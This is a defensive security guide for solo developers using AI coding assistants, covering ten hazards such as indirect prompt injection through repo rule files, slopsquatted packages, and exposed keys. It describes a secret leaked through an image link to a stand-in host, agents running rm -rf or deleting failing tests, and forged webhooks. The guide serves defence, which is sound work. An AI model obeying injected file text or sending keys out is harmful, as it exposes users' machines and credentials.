01 · why : fast code, real stakes

why solo builders get hit first

one person with an ai coding assistant can now build and publish a live website in a weekend.

that speed lets solo creators ship genuine tools without corporate permission or venture funding. it also creates a quiet blind spot. language models predict code that makes the screen light up and the happy path succeed, while routinely leaving database tables unlocked, secret api keys visible inside browser files, and paid endpoints open to unlimited bot traffic.

automated scanners watch certificate logs, domain registries, and public repositories around the clock, probing fresh sites within minutes of launch. meanwhile, your coding assistant holds a live terminal on your personal computer and treats outside web pages and private keys as identical words. written in greene-feynman clarity, every section below shows the everyday mechanism first, names the official security term second, and gives you the exact fix third.

02 · hazards : ten real-world break-ins explained plainly

how solo projects get compromised

five traps target your personal machine while you build. five traps target the live website or app you publish to the world.

showing all 10 hazards

part a · on your computer while coding with ai

01 · workstation trap

hidden orders inside outside files

formal name: indirect prompt injection

OWASP LLM01:2025

how it works

suppose you hand a stack of job applications to an eager clerk who obeys every sentence they read. buried in tiny print on page three, one applicant wrote: shred the other resumes and wire me a signing bonus. the clerk obeys because applicant text and boss instructions look identical on paper.

your coding agent reads issue tickets, fetched web docs, error logs, and repo rule files like .cursorrules or AGENTS.md in the same stream as your prompt. a single hidden line inside an outside file can order your tool to run shell commands on your machine.

how you stop it

  • read .cursorrules, AGENTS.md, CLAUDE.md, and package.json yourself before opening an unfamiliar repo in an agent.
  • inspect untrusted code inside a disposable folder or sandbox separate from your real projects.
  • fence fetched web text as passive data and test prompts with promptfoo.

02 · workstation trap

invented or lookalike software packages

formal name: package hallucination & supply-chain poisoning

OWASP A03:2025 · LLM03

how it works

models write code by guessing plausible words, so they regularly invent library names that sound completely real. attackers watch for those common model guesses, claim those exact names on npm or PyPI, and attach automatic setup scripts inside the box.

the moment you run the install command, that hidden postinstall script runs on your laptop and steals your saved keys. security researchers call these planted traps slopsquatting inside a software supply-chain attack.

how you stop it

  • check every unfamiliar package on its official registry for real age, downloads, and a linked source repo before installing.
  • install dependencies with --ignore-scripts so packages cannot run surprise shell code during setup.
  • commit lockfiles and scan them with osv-scanner.

03 · workstation trap

private keys pulled into the chat window

formal name: context exfiltration & secret disclosure

OWASP LLM02:2025

how it works

once your coding assistant opens your .env file or reads a pasted terminal log containing live passwords, those secrets sit inside the active conversation buffer and travel to remote model servers.

if a hostile web page hijacks that session, the agent can tuck your secret key onto the tail of an external image link like https://evil.example/p.png?key=... and leak it silently. deleting a committed key later still leaves it readable forever inside old .git history.

how you stop it

  • list .env, *.pem, and *.key in both .gitignore and agent ignore files such as .cursorignore and .claudeignore.
  • keep fake sample strings in .env.example so the model learns variable names safely.
  • scan git history with gitleaks and rotate any exposed key right away.

04 · workstation trap

unchecked auto-run loops wrecking real work

formal name: excessive agency

OWASP LLM06:2025

how it works

picture leaving a tireless crew alone overnight with a wrecking bar and one goal: stop a rattling pipe. by dawn the rattle is gone because they knocked down the load-bearing wall holding it.

when an unattended agent hits a stubborn error with full command freedom enabled, it tries sweeping fixes to turn the terminal green: running rm -rf, wiping a live database table, deleting failing security tests, or force-pushing over working commits.

how you stop it

  • keep blind auto-run switched off so deletions, migrations, and deploys pause for your human click.
  • point local development strictly at a disposable local database with fake rows.
  • read git diff yourself and require real command exit codes via zcabs.

05 · workstation trap

open local ports and extra live plugins

formal name: local network exposure & SSRF

OWASP A02:2025

how it works

many app frameworks launch local preview servers on 0.0.0.0, which opens your half-built app and debug tools to every stranger sharing the same coffee-shop or apartment wi-fi.

meanwhile, keeping extra plugins, database connectors, or a personal browser logged into gmail and your bank attached to your coding tool gives the model live bridges into accounts that have zero business touching your code.

how you stop it

  • bind local preview servers and local model runners strictly to loopback 127.0.0.1.
  • turn off every plugin and model context connector that the current task does not need.
  • test web apps inside a clean, logged-out browser profile and monitor outbound traffic with opensnitch.

part b · on the live website or app you publish

06 · live web trap

secret api keys bundled into browser code

formal name: client-side secret exposure

OWASP A04:2025

how it works

every file your website uses to draw screens and buttons downloads straight onto each visitor's computer. anyone can press F12, open the browser source tab, and search your code in ten seconds.

to make prototypes work fast, ai assistants routinely put NEXT_PUBLIC_ or VITE_ in front of paid openai, stripe, email, or database master keys. bots scrape fresh sites within minutes and max out stolen keys before lunch.

how you stop it

  • keep paid api keys, stripe secrets, and database service_role keys strictly inside server-only environment variables.
  • call paid apis and private database writes from a backend server route rather than browser code.
  • grep your codebase and build output for NEXT_PUBLIC_, VITE_, and sk- before deploying.

07 · live web trap

database tables left readable by any visitor

formal name: broken access control & missing row-level security

OWASP A01:2025 · Supabase RLS

how it works

removing a delete button from your webpage only hides the button on screen while leaving the database wide open behind it. hosted backends like supabase and firebase let browsers query tables directly using a public project url and key.

when a users, messages, or orders table goes live without per-row ownership locks, any visitor can type one line into their browser console to download every customer's private email or mark their own account as admin. broken access control sits at number one on the owasp top 10.

how you stop it

  • turn on row-level security on every exposed table and storage bucket before adding real user data.
  • write policies and server checks that read the verified session token rather than trusting a userId sent from the browser.
  • log in with two test accounts and confirm account A gets zero rows when asking for account B's data.

08 · live web trap

public forms and ai routes with zero spending brakes

formal name: unbounded consumption & denial of wallet

OWASP LLM10:2025

how it works

imagine wiring a public drinking fountain on a busy sidewalk straight to your personal credit card at ten cents a cup, with zero shutoff valve. the first person with a garden hose empties your checking account overnight.

when a public chat box, image generator, sms code sender, or file upload triggers a paid cloud call without speed limits or monthly dollar ceilings, automated scripts loop fifty thousand requests while you sleep.

how you stop it

  • set hard monthly spend limits and low-dollar email alerts on every ai, cloud, database, and email provider before launch, keeping auto-recharge off.
  • enforce per-ip and per-user rate limits on every login, signup, upload, and generation route.
  • cap input text length, upload byte size, and max_tokens on the server, and require sign-in before paid compute runs.

09 · live web trap

visitor text run as code and fake payment receipts

formal name: injection, cross-site scripting & unverified webhooks

OWASP A05 & A08:2025 · Stripe Webhooks

how it works

when a backend glues raw search words into a database command, visitors can type sql commands into a form box to dump your database. when a webpage drops raw comments or raw ai replies straight into live html via innerHTML or dangerouslySetInnerHTML, hidden scripts run inside other visitors' browsers and hijack their logins.

the same trust bug hits payments: if your /api/webhook route unlocks pro access whenever any post arrives saying paid, a stranger can send a fake receipt with curl for free.

how you stop it

  • use parameterized sql queries and validate every incoming request body on the server with Zod or Pydantic.
  • render user text and ai replies as plain text, ship a Content-Security-Policy header, and scan routes with semgrep.
  • verify cryptographic webhook signatures like Stripe-Signature on the raw request body before fulfilling orders.

10 · live web trap

homemade login code, loud crash pages, and zero backups

formal name: authentication, misconfiguration & recovery failures

OWASP A07 & A10:2025 · NIST SP 800-218A

how it works

coding assistants gladly write custom password hashing, session cookies, and password-reset links from scratch, often leaving guessable reset codes, non-expiring sessions, or open CORS: * headers that let outside sites read private user responses.

when a live route crashes and prints its full error trace to the screen, attackers see your internal file paths and library versions. and without an off-site backup, one bad migration wipes every user's work permanently.

how you stop it

  • use established auth libraries or managed auth with HttpOnly, Secure, SameSite=Lax cookies, plus multi-factor auth on your github, domain, and cloud accounts.
  • lock CORS to your exact domain, send Strict-Transport-Security and X-Content-Type-Options: nosniff, and show calm generic error screens to visitors.
  • enable automated daily database backups to a separate storage bucket and test restoring one copy before launch.

03 · depth : six concentric rings

rings : layered protection from laptop to live url

each ring limits the blast radius when an inner or outer layer slips.

0 secrets & spend caps

  • keep paid api keys, payment secrets, and admin database tokens in server-only variables and local keychains.
  • block .env and key files in .gitignore, .cursorignore, and .claudeignore.
  • set hard monthly spending ceilings on every ai and cloud account before publishing any link.

1 workspace bounds

  • open only the single project folder needed for the job, keeping personal files, taxes, and ssh keys outside that tree.
  • give parallel coding agents separate git worktree folders so concurrent runs stay clean.
  • open unfamiliar third-party code inside a disposable clone or sandbox.

2 human diff & proof gate

  • pause deletions, package installs, shell scripts, and database migrations for human approval.
  • read every line of git diff before committing or deploying model-generated code.
  • require real terminal exit codes and physical verification checks like zcabs.

3 server auth & row locks

  • check identity and row ownership on the server or database for every read, write, and delete.
  • enable row-level security on every exposed table and storage bucket.
  • validate request schemas on the server and verify webhook signatures on raw payloads.

4 verified packages & scans

  • verify package age, maintainer track record, and repo links before installing model suggestions.
  • run package installs with --ignore-scripts and commit exact lockfiles.
  • scan lockfiles with osv-scanner and scan source routes with semgrep.

5 loopback, headers & backups

  • bind local preview servers and local model runners strictly to 127.0.0.1 and switch off unused plugins.
  • ship Content-Security-Policy, Strict-Transport-Security, nosniff, and per-ip rate limits.
  • run automated off-site database backups and test a clean restore before launch.

05 · action : ten-minute readiness gate

checklist : workstation & pre-launch ship gate

click each gate as you verify it on your project. progress stays local in your browser.

0 / 12 gates verified

before you start your coding agent · 5 workstation habits

  1. 01open only the single project folder launch the agent inside one repository as a standard non-admin user, keeping personal taxes, mail, and ssh keys outside its folder reach.
  2. 02block .env in git and agent ignore lists add .env, *.pem, and *.key to .gitignore, .cursorignore, and .claudeignore so live keys stay out of prompts and commits.
  3. 03use a disposable local database while coding point local development strictly at local dummy data so a wild migration or delete loop never touches real customer records.
  4. 04verify new packages and pass --ignore-scripts confirm every model-suggested package is real and maintained on npm or pypi before installing with setup scripts disabled.
  5. 05bind dev servers to 127.0.0.1 & prune plugins keep local test ports invisible to public wi-fi neighbors and turn off unused mcp plugins and logged-in personal browsers.

before you share your public url · 7 live website & app gates

  1. 06confirm zero secret keys sit in browser code keep paid ai, email, stripe, and database service_role keys strictly on server routes without NEXT_PUBLIC_ or VITE_ prefixes, verified by gitleaks.
  2. 07lock every database table with row-level security enable RLS on every exposed table and test with two accounts to prove account A receives zero rows belonging to account B.
  3. 08set hard monthly dollar caps on every provider cap monthly spend and set low-dollar alerts on your ai, cloud, database, and email dashboards with unlimited auto-recharge switched off.
  4. 09rate-limit public forms, logins, and ai routes enforce per-ip and per-account request limits plus strict payload byte and max_tokens ceilings on every server route.
  5. 10verify webhook signatures on raw request bodies check cryptographic headers such as Stripe-Signature on the unparsed request body before granting paid plans or credits.
  6. 11parameterize sql, escape output, & ship csp headers use parameterized queries, render user and ai text as plain text, lock CORS to your domain, and send Content-Security-Policy and HSTS headers.
  7. 12enable mfa on accounts & test an off-site backup lock github, domain, and hosting logins with multi-factor auth, hide production stack traces, and verify one clean database backup restore.

inspection : copyable pre-ship terminal checks

# 1. scan files and full git history for leaked secrets
gitleaks detect --source . -v --redact

# 2. catch accidental frontend secret prefixes before deploy
git grep -nE "NEXT_PUBLIC_.*(SECRET|KEY|TOKEN)|VITE_.*(SECRET|KEY|TOKEN)|service_role"

# 3. confirm .env is ignored by git
git check-ignore -v .env

# 4. scan lockfiles and source routes for known security flaws
osv-scanner scan source -r .
semgrep scan --config auto

# 5. verify local dev servers listen on 127.0.0.1 only
ss -tulpn
netstat -ano | findstr LISTENING

# 6. inspect live security headers on your deployed domain
curl -sI https://your-domain.example | grep -iE "content-security-policy|strict-transport-security|x-frame-options|x-content-type-options"

06 · practice : solo agentic work

how to run overnight agents without handing over the house

an interactive chat, a multi-agent swarm, and an overnight daemon share one authority problem at different speeds: bound the checkout, bound the token, and gate the merge, aligned with NIST SP 800-218A.

1 one job, one tree

  • open only the repository that the active task needs, keeping personal records, banking files, mail, and ssh keys outside that folder tree.
  • give parallel agents separate git worktree checkouts so two loops keep clean, separate diffs.
  • review unfamiliar repositories inside a disposable clone, reading their skills, rules, and build scripts yourself before any agent loads them.

2 a daemon gets a narrow key

  • run unattended overnight work inside its own clone with a scoped token that can open a pull request on a feature branch while holding zero permission to push main, deploy live, or spend cloud funds.
  • keep customer databases, stripe secret keys, and root cloud admin tokens completely outside unattended agent environments.
  • require real command logs, exit code 0, and canary verification before trusting any completion summary.

3 capabilities stay off

  • treat every mcp server, browser profile, and cloud cli login as a live key: switch on only what the task needs and turn it off right after.
  • keep fetched web pages and issue comments fenced as passive data, and read repository instruction files yourself as executable code.
  • rotate any credential that enters an agent transcript right away so saved logs hold zero live authority.

isolation : separate worktrees for parallel agents

# give a second agent its own isolated checkout on a feature branch
git worktree add ../feature-pass -b agent/feature-pass

# inspect every changed line yourself before merging to main
git diff main...agent/feature-pass
